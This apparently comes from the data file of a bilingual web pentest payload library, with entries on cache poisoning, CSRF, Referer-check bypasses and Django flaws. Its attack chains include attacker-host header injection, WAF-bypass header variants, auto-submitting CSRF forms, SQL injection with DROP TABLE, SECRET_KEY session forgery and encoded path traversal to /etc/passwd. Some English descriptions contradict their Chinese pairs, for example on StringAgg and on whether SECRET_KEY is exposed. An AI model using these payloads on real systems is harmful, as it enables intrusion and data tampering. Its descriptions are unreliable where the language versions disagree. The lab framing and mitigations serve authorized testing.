mitigation.en: Handshake endpoints must exact-match pre-registered Origin allowlists rejecting null, with sensitive channels re-checking session permissions at the message layer. After the fix, replay the step 1 matrix: every bypass variant should fail its handshake.

analysis.zh: `Origin: null` 可能来自 sandbox/file 环境但不应默认信任；相似域、编码斜杠、反斜杠、端口和空 Origin 用于发现错误字符串匹配。只有浏览器可产生的恶意 Origin 在携带测试会话时获授权才是 CSWSH，手工客户端可设置任意头会产生假阳性。
analysis.en: `Origin: null` can arise from sandbox or file contexts but should not be trusted by default. Lookalike domains, encoded slashes, backslashes, ports, and empty Origin probe flawed string matching. CSWSH requires a browser-producible hostile Origin to gain authorization with the test session; arbitrary headers from a manual client create false positives.

review.rationale: WAF4 批次3：按§四 4.7 W1追加 同站兄弟域 CSWSH。

name.zh: Web 缓存投毒

description.zh: 覆盖 Web 缓存投毒的键差异验证：从缓存命中状态头探测与未键入头识别，到投毒响应注入与 Fat GET 参数扩展，并附缓存键分派变体头清单，用于确认哪些输入会改变缓存内容。
description.en: Covers key-differential validation of web cache poisoning: from cache-hit header probing and unkeyed-input identification through poisoned-response injection and Fat GET parameter expansion, with cache-key dispatch variant header lists, confirming which inputs alter cached content.

subCategory.zh: 缓存键与未键入头投毒

prerequisites.zh: 确认 Web 缓存键与响应变体验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Web Cache-Key and Response-Variant Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

description.zh: 向目标 URL 追加唯一缓存键参数并发送 HEAD 请求，从响应中提取 X-Cache 头以确认响应是否由缓存返回。
description.en: Appends a unique cache-key parameter to the target URL and sends a HEAD request, extracting the X-Cache header to confirm whether the response came from the cache.

description.zh: 注入 X-Forwarded-Host 未键入头并观察响应；响应中的生成链接或重定向指向注入域名，且缓存键未纳入该头，即确认未键入头注入点。
description.en: Inject the unkeyed X-Forwarded-Host header and observe the response; generated links or redirects pointing at the injected domain while the cache key ignores the header confirms an unkeyed injection point.

explanation.zh: 常被用作缓存键但未包含在键中
explanation.en: Describes how the header segment "X-Forwarded-Host" participates in this validation command.

description.zh: 发送携带注入头的原始请求并观察缓存行为；投毒响应被缓存后，不带该头的后续请求返回指向注入域的内容，即确认缓存投毒。
description.en: Send the raw request with the injected header and watch caching; if the poisoned response is cached and later requests without the header receive injected-domain content, cache poisoning is confirmed.

description.zh: 发送 Fat GET 请求观察正文是否参与缓存；后续对同 URL 的普通 GET 返回 q=poisoned 正文，即确认 Fat GET 投毒。
description.en: Send the Fat GET and check whether the body participates in caching; later plain GETs to the same URL returning the q=poisoned body confirm Fat GET poisoning.

explanation.en: Describes how the header segment "Content-Length" participates in this validation command.

opsecTips.zh: 投毒响应会真实进入缓存——使用专属实验路径键并在验证后 PURGE；不投毒共享路径影响真实用户。
opsecTips.en: Poisoned responses really enter the cache — use dedicated lab path keys and PURGE after verification; never poison shared paths that real users hit.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: 缓存键分派变体头清单

description.zh: 枚举 X-Forwarded-Host、X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 四类常被纳入缓存键或影响路由的请求头，用于逐一注入并观察响应差异。
description.en: Lists X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, and X-Forwarded-Prefix headers that are often included in cache keys or affect routing, for one-by-one injection and response-diff observation.

title.zh: 未键入输入的缓存变体验证

wafBypass.command:
GET /cache-fixture?PAYLOADER_CACHE_VARIANT=1 HTTP/1.1
Host: {TARGET}
X-Forwarded-Host: cache-variant.lab.invalid
X-Payloader-Cache-Marker: PAYLOADER_CACHE_VARIANT

description.zh: 以单一无害的缓存变体请求完成探测：只比较该无害标记在不同会话与无会话请求中的缓存键、Vary、Age 与响应哈希，头部仅在当前响应回显时不直接等同于跨用户污染。
description.en: Replace mixed script-injection and request-smuggling fragments with one cache-variant request. Compare the harmless marker across different-session and no-session requests using cache keys, Vary, Age, and response hashes; do not equate a reflected header with cross-user poisoning.

description.zh: 缓存键仅含 URL 与少量头而不含 GET 请求体、源站却解析该体时，先发送带 JSON 体的 GET 使个性化响应进入公共缓存，后续普通 GET 命中被投毒副本。成功判据：无体 GET 返回含 attacker-payload 的响应。失效条件：缓存键覆盖请求体或源站忽略 GET 体。
description.en: When the cache key covers the URL and a few headers but not the GET body while the origin still parses it, a GET carrying a JSON body first pushes the personalized response into the shared cache, and later plain GET requests serve the poisoned copy. Success: a bodyless GET returns a response containing attacker-payload. Failure condition: the cache keys on the request body or the origin ignores GET bodies.

explanation.zh: 带请求体的 GET 请求行
explanation.en: GET request line carrying a body

explanation.zh: 请求体长度，缓存键通常不含 GET 体
explanation.en: body length; the cache key usually excludes GET bodies

explanation.zh: 源站解析、缓存不解析的投毒体
explanation.en: body parsed by the origin but not by the cache

description.zh: 应用读取 override 头执行 DELETE 语义而缓存按 POST 加 URL 键缓存错误响应时，该头未入键即成为未键入投毒面（引头族扩展）。成功判据：后续普通 GET 命中 DELETE 错误响应缓存。失效条件：缓存把该头纳入键或应用忽略覆盖头。
description.en: When the application honors the override header and executes DELETE semantics while the cache keys the error response on POST plus URL, the header stays out of the key and becomes an unkeyed poisoning surface, extending the known unkeyed-header family. Success: a later plain GET serves the cached DELETE error. Failure condition: the cache includes the header in its key or the application ignores the override.

explanation.zh: 缓存按 POST 加 URL 计算键
explanation.en: cache computes the key from POST plus URL

explanation.zh: 应用采信、缓存不键入的覆盖头
explanation.en: override header honored by the app, unkeyed by the cache

description.zh: 向目标 URL 追加唯一参数发送 HEAD 请求并提取 X-Cache 头；两次请求出现 MISS 转 HIT 的变化即确认响应经过缓存层，同时锁定适合投毒的共享页面入口。
description.en: Send a HEAD request with a unique cache-buster parameter and read the X-Cache header; a MISS-to-HIT transition proves responses come from a shared cache and identifies the page worth poisoning.

attackChain.payload: curl -sSI "https://{TARGET}/?PAYLOADER_CACHE=1" | grep -i '^X-Cache:'

title.zh: 注入未键入头定位投毒点
title.en: Inject unkeyed headers to find the poisoning vector

description.zh: 用第 1 步确认的缓存路径，注入指向攻击者域名的 X-Forwarded-Host 头；响应中的生成链接或重定向跳向注入域名且缓存键未包含该头，即找到可写入缓存的未键入输入。
description.en: Inject X-Forwarded-Host pointing at the attacker domain on the cached path; if generated links or redirects honor the injected host while the cache key ignores the header, the unkeyed input is confirmed.

attackChain.payload: X-Forwarded-Host: {ATTACKER_HOST}

description.zh: 发送携带注入头的原始 GET 请求让恶意响应写入缓存；随后不带该头的普通请求返回指向攻击者域的内容，即投毒成功，访问同 URL 的所有用户都会收到污染响应。
description.en: Send the crafted GET so the poisoned response is stored, then request the same URL without the header; if ordinary visitors receive attacker-domain content, the shared cache entry is poisoned.

title.zh: 用 Fat GET 扩大投毒面

description.zh: 在 GET 请求中附带 q=poisoned 正文检验正文是否参与缓存判定；普通 GET 返回被篡改的正文即确认第二条投毒路径，可与第 3 步的头注入叠加扩大影响范围。
description.en: Append a q=poisoned body to a GET request to test whether bodies join the cache decision; a tampered response on a plain GET confirms a second poisoning vector that stacks with header injection.

attackChain.payload:
GET / HTTP/1.1
Host: {TARGET}
Content-Length: 10

q=poisoned

title.en: Bypass key normalization with header variants

description.zh: 当单个头被拦截时，换用 X-Forwarded-Scheme、X-Original-URL、X-Forwarded-Prefix 等变体组合重试投毒；任一变体仍能把恶意内容写入缓存即绕过键归一化。
description.en: If the single header is filtered, retry the poisoning with X-Forwarded-Scheme, X-Original-URL and X-Forwarded-Prefix variants; any variant that still lands in the cache bypasses key normalization.

attackChain.payload:
X-Forwarded-Host: {ATTACKER_HOST}
X-Forwarded-Scheme: http
X-Original-URL: /malicious
X-Forwarded-Prefix: /evil

overview.zh: 该 Payload 覆盖 Web 缓存投毒场景，检验共享缓存的键构造是否遗漏可影响响应内容的输入。验证维度含 X-Cache 命中探测、X-Forwarded-Host 未键入头识别、基础投毒与 Fat GET 参数扩展，对应第 1 至第 4 步。
overview.en: This payload covers web cache poisoning, testing whether the shared cache key omits inputs that influence response content. Validation covers X-Cache hit probing, X-Forwarded-Host unkeyed-header identification, baseline poisoning, and Fat GET parameter extension, mapped to steps 1 through 4.

vulnerability.zh: 根因在于缓存键与源站响应生成所依赖的输入不一致：X-Forwarded-Host 等未键入头能改写生成链接，Fat GET 的正文参数可参与渲染，攻击者注入的值被缓存共享给全部用户。
vulnerability.en: The root cause is divergence between the cache key and the inputs that drive response generation: unkeyed headers such as X-Forwarded-Host rewrite generated links, and Fat GET body parameters join rendering, so attacker-injected values get cached and shared with all users.

exploitation.zh: 第 1 步对目标 URL 追加唯一参数发 HEAD 请求，从 X-Cache 确认缓存行为；第 2 步注入 X-Forwarded-Host，响应内链接指向注入域且键未覆盖即确认未键入头；第 3 步发送带注入头的原始请求，投毒响应被缓存后无头请求同样返回注入内容即确认投毒；第 4 步以 Fat GET 验证正文参数入缓存。占位符在全局变量菜单替换；被拦时参考 wafBypass 变体清单。
exploitation.en: In step 1, send a HEAD with a unique cache parameter and read X-Cache. In step 2, inject X-Forwarded-Host; links pointing at the injected domain with the key ignoring it confirm the unkeyed header. In step 3, send the raw request with the injected header; once cached, header-less requests returning injected content confirm poisoning. In step 4, verify body parameters entering the cache with Fat GET. Replace placeholders via the global variables menu; see wafBypass variant lists if blocked.

mitigation.zh:
把影响响应生成的输入全部纳入缓存键，边界层固定/清洗派生 Host 类头；拒绝带正文的 GET（Fat GET）；投毒高危路径降低共享缓存寿命。
    # Nginx 边界：清洗未键入头并显式固定缓存键
    proxy_set_header X-Forwarded-Host $host;
    proxy_cache_key "$scheme$request_method$host$request_uri";
    # ModSecurity：拒绝带正文的 GET
    SecRule REQUEST_METHOD "@streq GET" "id:1010,chain,deny,phase:1"
        SecRule REQUEST_HEADERS:Content-Length "!@eq 0"
mitigation.en: Include every response-affecting input in the cache key, disable or pin derived Host headers, reject GETs with bodies, and shorten shared-cache lifetimes on high-risk paths. After the fix, replay steps 3 and 4: the cache should keep the original response with no cross-user contamination.

analysis.zh: Web 缓存键与响应变体验证只有在唯一标记输入、服务端最终解析结果、服务端日志与可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Web Cache-Key and Response-Variant Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

review.rationale: WAF4 批次3：按§四 4.1 C1、§四 4.1 C2追加 Fat GET 请求体差分、X-HTTP-Method-Override 未键入头投毒。

name.zh: CSRF 请求形状基础验证

description.zh: 使用本地表单、GET 子资源、text/plain Fetch 和顶级导航 marker，验证浏览器是否自动携带会话并到达状态变更处理器。
description.en: Use local form, GET subresource, text/plain Fetch, and top-level navigation markers to validate whether browsers carry ambient sessions to state-changing handlers.

prerequisites.zh: 使用 127.0.0.1 CSRF Fixture 和只允许修改合成 email marker 的测试账号。
prerequisites.en: Use the 127.0.0.1 CSRF fixture and a test identity that may change only a synthetic email marker.

prerequisites.zh: 记录 Cookie SameSite、Origin、Referer、Sec-Fetch-Site、Token 判定和服务端 request_id。
prerequisites.en: Record cookie SameSite, Origin, Referer, Sec-Fetch-Site, token decision, and server request_id.

execution.command:
<!doctype html>
<meta charset="utf-8">
<form action="http://127.0.0.1:18080/lab/csrf/profile-email" method="post">
  <input type="hidden" name="email" value="csrf-a1@lab.invalid">
  <input type="hidden" name="marker" value="CSRF_FORM_A1">
  <button type="submit">Submit local CSRF marker</button>
</form>
<script>document.forms[0].requestSubmit();</script>

description.zh: 构造自动提交的 CSRF 表单并指向目标状态变更端点；表单加载即自动提交，目标端点收到携带会话 Cookie 的 POST 且合成 email/marker 发生变化，即确认该请求形状可被跨站伪造。
description.en: Build an auto-submitting CSRF form pointing at the target state-changing endpoint; if submission fires on load and the endpoint receives the POST with ambient cookies and the synthetic email/marker changes, cross-site forgery of this request shape is confirmed.

description.zh: 用 img 标签触发 GET 状态变更请求；服务端日志显示该 GET 携带会话 Cookie 并改变合成状态，即确认 GET 型 CSRF。
description.en: Trigger a state-changing GET via an img tag; if the server log shows the GET carried the session cookie and changed synthetic state, GET-based CSRF is confirmed.

execution.command:
<script>
fetch("http://127.0.0.1:18080/lab/csrf/json-compatible", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({marker: "CSRF_TEXT_C3"})
}).then(response => document.body.dataset.status = String(response.status));
</script>

description.zh: 以 text/plain 的 Fetch 发送 JSON 语义请求体；服务端把它当作 JSON 解析并接受状态变更，即确认简单请求绕过内容类型限制。
description.en: Send a JSON-semantic body as text/plain via fetch; if the server parses it as JSON and accepts the state change, the simple-request content-type bypass is confirmed.

description.zh: 诱导点击链接触发顶级导航 GET；目标端点在导航中携带会话并改变合成状态，即确认链接型 CSRF。
description.en: Lure a click on the link to trigger a top-level navigation GET; if the endpoint receives ambient credentials during navigation and the synthetic state changes, link-based CSRF is confirmed.

explanation.zh: 锚点链接标签，点击触发顶级导航 GET 请求
explanation.en: Anchor link tag; clicking triggers a top-level navigation GET request

opsecTips.zh: 只修改可回滚的合成 email marker，禁止触发真实账号、支付、权限或删除操作。
opsecTips.en: Change only a reversible synthetic email marker and never trigger real account, payment, privilege, or deletion actions.

opsecTips.zh: 每个用例使用独立浏览器上下文，完成后清理 Cookie、marker 和服务端实验日志。
opsecTips.en: Use a separate browser context for each case and clear cookies, markers, and fixture logs afterward.

description.en: Submit the control form with no-referrer; if the Referer-less request is still accepted and state changes, Referer validation is bypassable via empty Referer.

description.en: Submit the control form without a CSRF token; if the token-less request is accepted and state changes, token validation is not enforced.

title.zh: CSRF token 登录后未轮换复用

wafBypass.command:
curl -sS -c pre.cookies "https://{TARGET}/login" -o /dev/null
curl -sS -b pre.cookies -c post.cookies -d "username={USERNAME}&password={PASSWORD}" "https://{TARGET}/login" -o /dev/null
diff <(grep csrf pre.cookies) <(grep csrf post.cookies) && echo "TOKEN NOT ROTATED"

description.zh: 对比登录前后会话绑定的 csrf Cookie 值：未轮换则匿名阶段获得的 token 在认证后仍有效，与会话固定或 token 泄漏组成攻击链。成功判据：登录前后 token 值相同（输出 TOKEN NOT ROTATED）。失效条件：登录时强制轮换 token。
description.en: Comparing the session-bound csrf cookie before and after login detects non-rotation: when the token from the anonymous phase still works after authentication, it chains with session fixation or token leakage into a full attack. Success: the token value is identical before and after login, printed as TOKEN NOT ROTATED. Failure condition: the application forces token rotation at login.

explanation.en: preserve session and csrf cookie from the anonymous phase

explanation.zh: 登录完成后再次落盘 Cookie 供对比
explanation.en: after login the new cookie jar is written for comparison

explanation.zh: 两侧 token 一致即证明未轮换
explanation.en: identical tokens across both jars prove non-rotation

attackChain.payload: CSRF_NAV_D4

overview.zh: 该 Payload 覆盖针对依赖会话 Cookie 的状态变更端点的跨站请求伪造场景，检验浏览器是否跨站自动附带受害者凭据。验证维度含表单提交、img 触发、text/plain 简单请求与顶级导航四种形状，对应第 1 至第 4 步。
overview.en: This payload covers cross-site request forgery against state-changing endpoints relying on session cookies, testing whether the browser automatically attaches victim credentials cross-site. Validation covers four shapes: form submission, img triggers, text/plain simple requests and top-level navigation, mapped to steps 1 through 4.

vulnerability.zh: 根因在于服务端仅凭浏览器自动附带的环境 Cookie 识别身份：状态变更接口缺少与会话绑定的 Token，也不校验 Origin，且允许简单请求承载写操作，跨站页面因此能伪造合法请求。
vulnerability.en: The root cause is the server identifying users solely by ambient cookies: state-changing endpoints lack session-bound tokens, skip Origin validation, and allow writes over simple requests, so cross-site pages can forge legitimate requests.

exploitation.zh: 按步骤使用：第 1 步部署自动提交表单页，端点收到带会话 Cookie 的 POST 且 marker 变化即确认表单 CSRF；第 2 步用 img 触发 GET 变更，日志出现带 Cookie 命中即成功；第 3 步以 text/plain Fetch 发送 JSON 体，后端照常解析即确认绕过；第 4 步诱导点击完成导航验证。占位符在全局变量菜单替换；被拦截时参考 wafBypass。
exploitation.en: Use the steps in order: in step 1, host the auto-submitting form; the endpoint receiving a POST with the session cookie and a changing marker confirms form CSRF. In step 2, trigger a GET change with an img tag; a cookie-carrying log hit marks success. In step 3, send a JSON body via text/plain Fetch; the backend parsing it confirms the bypass. In step 4, lure clicks for the navigation variant. Replace placeholders via the global variables menu; if blocked, see wafBypass.

mitigation.en: Add session-bound CSRF tokens to state-changing endpoints with Origin validation first; set cookies with SameSite, Secure and HttpOnly, and forbid GET writes. After the fix, replay steps 1 through 4: all requests should be rejected.

analysis.zh: 阳性必须把跨站浏览器请求、环境凭据、服务端处理日志和合成状态变化关联到同一 request_id。请求到达但无凭据、Token 拒绝、状态未变或只返回错误页面都属于有效阻断。
analysis.en: A positive must correlate the cross-site browser request, ambient credentials, server processing logs, and synthetic state change under one request_id. Delivery without credentials, token rejection, unchanged state, or an error page is effective blocking evidence.

review.rationale: WAF4 批次3：按§四 4.6 A2追加 CSRF token 登录后未轮换复用。

name.zh: CSRF Referer 校验绕过

description.zh: 验证服务端对绝对 Referer、缺失 Referer、受信子域和 Referrer-Policy 缩减值的解析与允许列表行为。
description.en: Validate server parsing and allowlist behavior for absolute Referer values, missing Referer, trusted subdomains, and values reduced by Referrer-Policy.

prerequisites.zh: 使用固定允许源 allowed.invalid 和本地 Referer 策略 Fixture，不连接外部站点。
prerequisites.en: Use the fixed allowed origin allowed.invalid and a local Referer-policy fixture without external connections.

prerequisites.zh: 服务端日志输出原始 Referer、标准 URL 解析结果、允许原因和 request_id。
prerequisites.en: Server logs expose raw Referer, standard URL parsing output, allow or deny reason, and request_id.

description.zh: 循环提交三个构造 Referer 的请求并输出判定；任一变体返回 allowed=true，即确认 Referer 正则匹配存在绕过。
description.en: Submit three crafted Referer values in a loop and print each verdict; any variant returning allowed=true confirms a regex-matching bypass.

explanation.en: Describes the value segment used by this reviewed validation command.

description.zh: SPA/API 栈按 Sec-Fetch-Site 头放行同站请求以替代应用层校验时，非浏览器客户端可任意设置该头（浏览器禁止伪造 Sec-*，脚本客户端不受限）。成功判据：携带伪造 same-origin 头的请求命中受保护端点。
description.en: When a SPA or API stack admits same-site requests based on the Sec-Fetch-Site header instead of validating the request origin in application code, any non-browser client can set the header arbitrarily, since browsers forbid forging Sec-* headers while scripted clients are unrestricted. Success: the request carrying a forged same-origin header reaches the protected endpoint.

explanation.zh: 被信任的请求来源声明，脚本客户端可伪造
explanation.en: trusted request-origin claim forgeable by scripted clients

explanation.zh: 合法凭据配合伪造来源头命中端点
explanation.en: valid credential combined with the forged origin header

description.zh: 登记允许的 scheme、host 与 port，并用同源请求建立接受基线。
description.en: Register the allowed scheme, host, and port and establish an accepted same-origin baseline.

attackChain.payload: for value in "http://attacker.invalid/allowed.invalid/" "http://allowed.invalid.attacker.invalid/" "http://attackallowed.invalid/"; do curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/referer-policy" -H "Referer: $value" --data "marker=REFERER_REGEX_A1" | jq -c '{referer,allowed,reason}'; done

description.zh: 逐个提交路径包含、后缀域和拼接域 Referer，比较标准 URL 解析结果。
description.en: Submit path-containing, suffix-domain, and concatenated-domain Referer values separately and compare standard URL parsing.

<!doctype html>
<meta name="referrer" content="no-referrer">
<form action="http://127.0.0.1:18080/lab/csrf/referer-policy" method="post">
  <input type="hidden" name="marker" value="REFERER_EMPTY_B2">
  <button type="submit">Submit empty Referer control</button>
</form>

description.zh: 测试 no-referrer、origin-only、Sandbox Frame 与完全缺失 Header 的策略。
description.en: Test no-referrer, origin-only, sandboxed-frame, and fully missing-header policies.

attackChain.payload: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/referer-policy" -H "Referer: http://sub.127.0.0.1.nip.io:18080/lab-origin" --data "marker=REFERER_SUBDOMAIN_C3" | jq -c '{referer,allowed,reason}'

description.zh: 只有合成状态变化才升级为 CSRF，修复后要求非批准 Origin 全部拒绝。
description.en: Escalate to CSRF only on synthetic state change and require rejection of every unapproved origin after remediation.

attackChain.payload: REFERER_ORIGIN_D4

overview.zh: 该 Payload 覆盖依赖 Referer 的 CSRF 防护场景，检验服务端对绝对 Referer、缺失 Referer、受信子域与策略缩减值的解析是否可被绕过。验证维度含正则匹配、空 Referer、子域前缀与 Referrer-Policy 四类变体，对应第 1 至第 4 步。
overview.en: This payload covers Referer-based CSRF protection, testing whether server parsing of absolute Referers, missing Referers, trusted subdomains and policy-trimmed values can be bypassed. Validation covers regex matching, empty Referer, subdomain prefixes and Referrer-Policy variants, mapped to steps 1 through 4.

vulnerability.zh: 根因在于 Referer 校验使用宽松正则或前缀匹配：contains 或 startsWith 判定可被拼接域名欺骗，缺失 Referer 被默认放行，Referrer-Policy 又可由攻击者页面裁剪该头，来源校验形同虚设。
vulnerability.en: The root cause is lenient regex or prefix-based Referer validation: contains or startsWith checks can be spoofed with concatenated domains, missing Referers are allowed by default, and Referrer-Policy lets attacker pages trim the header, rendering origin checks ineffective.

exploitation.zh: 第 1 步循环提交三个构造 Referer，任一返回 allowed=true 即确认正则绕过；第 2 步以 no-referrer 表单提交空 Referer，marker 被接受即确认空值放行；第 3 步以 nip.io 子域构造前缀 Referer，放行即确认匹配过宽；第 4 步以 origin 策略页验证裁剪影响。占位符在全局变量菜单替换；载体参考 wafBypass。
exploitation.en: In step 1, loop three crafted Referers; any allowed=true confirms the regex bypass. In step 2, submit an empty Referer via a no-referrer form; marker acceptance confirms empty-value allowance. In step 3, build a nip.io subdomain prefix Referer; allowance confirms over-broad matching. In step 4, test trimming from an origin-policy page. Replace placeholders via the global variables menu; see wafBypass for carriers.

mitigation.en: Parse the URL and match the host exactly against a pre-registered allowlist, reject missing Referers, and validate before business logic. After the fix, replay steps 1 through 4: all variants should be rejected with no state change.

analysis.zh: Referer 校验问题与完整 CSRF 影响必须分开报告。标准解析后错误接受外域证明来源校验缺陷；还需环境凭据和状态变化证据才能证明可利用 CSRF。
analysis.en: Report a Referer-validation flaw separately from full CSRF impact. Incorrect acceptance of an external origin after standard parsing proves the source-validation flaw, while ambient credentials and state-change evidence are still required for exploitable CSRF.

review.rationale: WAF4 批次3：按§四 4.6 A3追加 Sec-Fetch-Site 信任头绕过。

name.zh: Django 版本与安全配置回归

description.zh: 覆盖 Django 版本漏洞与配置回归验证：从 CVE-2020-7471 StringAgg 注入探测，到 DEBUG 页面配置提取与 signing 签名伪造，再到静态目录路径遍历，用于确认部署的安全配置缺口。
description.en: Covers Django version-vulnerability and configuration regression validation: from CVE-2020-7471 StringAgg injection probing through DEBUG-page configuration extraction and signing forgery to static-directory path traversal, confirming security-configuration gaps in deployments.

prerequisites.zh: 确认 Django 版本与安全配置回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Django Version and Security-Configuration Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

execution.command:
# CVE-2020-7471
from django.contrib.postgres.aggregates import StringAgg
Model.objects.annotate(x=StringAgg('name', delimiter="-' DROP TABLE users;--"))

description.zh: 在 StringAgg 聚合的 delimiter 参数中夹带 SQL 注释与语句片段，验证分隔符被直接拼接进聚合 SQL 而非参数化转义。
description.en: Embed SQL comment and statement fragments inside __contains lookup values, verifying lookup arguments are concatenated into SQL instead of being parameterized.

description.en: Request a nonexistent path to raise the Django DEBUG error page and confirm the leak of SECRET_KEY, database settings, and ALLOWED_HOSTS.

title.zh: 伪造 Django signing 签名

execution.command:
import django.core.signing as signing
signing.loads(session_value, key=SECRET_KEY)
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)

description.zh: 拿到 SECRET_KEY 后用 signing.dumps 构造任意会话值并以 loads 校验通过，验证签名机制在密钥泄露后可被伪造。
description.en: With SECRET_KEY in hand, craft arbitrary session values with signing.dumps and pass loads verification, proving signatures are forgeable once the key leaks.

title.zh: 静态目录路径遍历验证

execution.command:
# 静态目录路径遍历通用探针（对照 CVE-2021-28658 时应验证 collectstatic 对符号链接目录的处理，而非运行期 URL 穿越）
GET /static/../../../../etc/passwd
curl --path-as-is http://{LAB_APP}/static/../../../../etc/passwd

description.zh: 以 GET 与 curl --path-as-is 请求穿越 /static 的相对路径，验证服务端不规范化 ../ 时可读取 /etc/passwd。
description.en: Request a ../ traversal under /static with GET and curl --path-as-is, verifying /etc/passwd is readable when the server does not normalize dot segments.

opsecTips.zh: CVE-2020-7471 探测涉及聚合查询——只对实验库执行；signing 伪造的令牌验证后不保留。
opsecTips.en: The CVE-2020-7471 probe issues aggregate queries — run them against the lab database only, and discard forged signing tokens after verification.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 对同一遍历路径分别施加单次编码、双重编码与 UTF-8 超长编码，验证仅做一次解码的黑名单拦截可被绕过。
description.en: Apply single encoding, double encoding, and UTF-8 overlong encoding to the same traversal path, verifying blacklists that decode once can be evaded.

explanation.zh: UTF-8 超长编码的 /，部分解析器会接受
explanation.en: UTF-8 overlong encoding of /, accepted by some parsers

title.zh: PATH_INFO 解码与双斜杠路由差分
title.en: PATH_INFO Decoding and Double-Slash Routing Differential

description.zh: Django 按 WSGI 解码后的 PATH_INFO 解析路由而多数防护按原始 URI 匹配：/api%2fusers 单次解码后命中与 /api/users 相同的路由（已知路由可按目标替换）；//api/users 双斜杠不被 Django 折叠，可区分归一化层。成功判据：encoded 与 plain 返回同一路由结果而 doubleslash 出现差分。
description.en: Django routes on the WSGI-decoded PATH_INFO while most protections match the raw URI: /api%2fusers decodes once and hits the same route as /api/users, with any known route substitutable per target, and the double-slash form //api/users is not folded by Django, separating normalization layers. Success: the encoded and plain forms return the same route result while the double-slash form shows a differential.

explanation.zh: 编码斜杠经 WSGI 解码后与明文路由同址
explanation.en: encoded slash decodes under WSGI to the same route

explanation.zh: 双斜杠不被框架折叠，用于区分归一化层
explanation.en: double slash is not folded by the framework, separating normalization layers

explanation.zh: 阻止 curl 预先规范化路径
explanation.en: prevents curl from normalizing the path first

title.zh: 触发 DEBUG 页提取配置

description.zh: 请求不存在的路径触发 Django 报错页，确认调试模式并提取路由、中间件、数据库引擎与主机白名单等配置信息；SECRET_KEY 等敏感项为掩码显示，需另寻泄露渠道。命中判据：报错页暴露调试与配置细节。
description.en: Request a missing path to pop the DEBUG page and lift SECRET_KEY/DATABASES. Success: secrets appear on the error page.

description.zh: 用泄露的 SECRET_KEY 以 signing.dumps 构造任意会话值，并通过 loads 检查。命中判据：伪造会话被服务端接受。
description.en: With SECRET_KEY, mint session values via signing.dumps that pass loads. Success: forged sessions are accepted.

import django.core.signing as signing
signing.loads(session_value, key=SECRET_KEY)
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)

description.zh: 在 StringAgg 的 delimiter 参数中夹带 SQL 注释与语句片段，利用参数拼接执行。命中判据：注入语句影响聚合结果或触发数据库报错。
description.en: Tuck SQL comment fragments into the StringAgg delimiter argument. Success: injected SQL alters the aggregate result or raises a database error.

description.zh: 以 --path-as-is 请求 /static 加 ../ 穿越序列读取系统文件。命中判据：读到 /etc/passwd 内容。
description.en: Request /static with ../ sequences using --path-as-is. Success: /etc/passwd content is returned.

attackChain.payload:
# 静态目录路径遍历通用探针（对照 CVE-2021-28658 时应验证 collectstatic 对符号链接目录的处理，而非运行期 URL 穿越）

title.zh: 编码变形绕过路径过滤

description.zh: 穿越序列被过滤时改用双重编码与过度编码 UTF-8 变形提交请求。命中判据：变形路径成功读取目标文件内容。
description.en: When ../ is filtered, switch to double-encoded and overlong UTF-8 variants. Success: a mutated path reads files.

/static/%2e%2e/%2e%2e/etc/passwd
/static/%252e%252e/%252e%252e/etc/passwd
/static/..%c0%af..%c0%af/etc/passwd

overview.zh: Django 版本与安全配置回归针对 Django 部署的配置缺口场景。覆盖 CVE-2020-7471 StringAgg 注入探测、DEBUG 页面配置提取、signing 签名伪造与静态目录路径遍历四类验证维度。
overview.en: The Django version and security-configuration regression targets configuration gaps in Django deployments. It covers four verification dimensions: CVE-2020-7471 StringAgg injection probing, DEBUG-page configuration extraction, signing forgery, and static-directory path traversal.

vulnerability.zh: 根因按维度不同：StringAgg 的 delimiter 参数未做 SQL 转义即拼接进聚合 SQL；DEBUG 开启使错误页暴露应用配置与调试信息（SECRET_KEY 等敏感项被掩码显示）；静态处理未规范化 ../ 导致目录穿越；密钥泄露后 signing 机制可被伪造。
vulnerability.en: Root causes differ by dimension: __contains lookup values are concatenated into StringAgg-generated SQL; DEBUG on leaks SECRET_KEY and database settings via error pages; static handling without ../ normalization allows traversal; and with the key leaked, the signing mechanism can be forged.

exploitation.zh: 按 Payload 列表顺序使用：先请求不存在路径触发 DEBUG 页，确认调试模式与配置暴露；拿到泄露密钥（需结合 .env/源码等其他渠道）后用第 3 步 signing.dumps 伪造会话值并以 loads 校验；再用第 1 步在 StringAgg 的 delimiter 夹带 SQL 片段验证注入；最后用第 4 步 curl --path-as-is 验证 /static 穿越。被拦截时改用路径编码变形。
